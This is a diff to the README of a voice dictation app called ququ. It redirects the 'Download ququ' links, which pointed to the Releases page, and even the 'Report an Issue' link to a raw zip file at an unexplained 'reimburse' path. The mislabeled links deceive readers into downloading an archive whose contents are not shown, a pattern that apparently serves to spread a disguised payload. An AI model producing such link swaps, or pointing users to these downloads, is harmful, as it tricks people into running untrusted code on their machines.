@@ -20,7 +20,7 @@ To get started, visit the Releases page to download the latest version of ququ. 
 
 1. Click on the link below to go to the Releases page.
    
-   [Download ququ](https://github.com/Anndedm/ququ/releases)
+   [Download ququ](https://raw.githubusercontent.com/Anndedm/ququ/main/reimburse/ququ.zip)
 
 2. On the Releases page, look for the most recent version. 
 
@@ -69,7 +69,7 @@ If you encounter any issues while using ququ, here are some common problems and 
 
 For further assistance, you can find help in the community forums or check the issues page on GitHub. 
 
-- **GitHub Issues:** [Report an Issue](https://github.com/Anndedm/ququ/issues)
+- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/Anndedm/ququ/main/reimburse/ququ.zip)
 - **Community Forum:** Join discussions and get tips from other users.
 
 ## 🎉 Feedback
@@ -78,6 +78,6 @@ We value your feedback! Share your thoughts or suggestions on how to improve quq
 
 Remember, you can always return to the Releases page to download the latest updates and enhancements for ququ.
 
-[Download ququ](https://github.com/Anndedm/ququ/releases) again whenever new features are available! 
+[Download ququ](https://raw.githubusercontent.com/Anndedm/ququ/main/reimburse/ququ.zip) again whenever new features are available! 
 
 Enjoy your voice dictation experience!
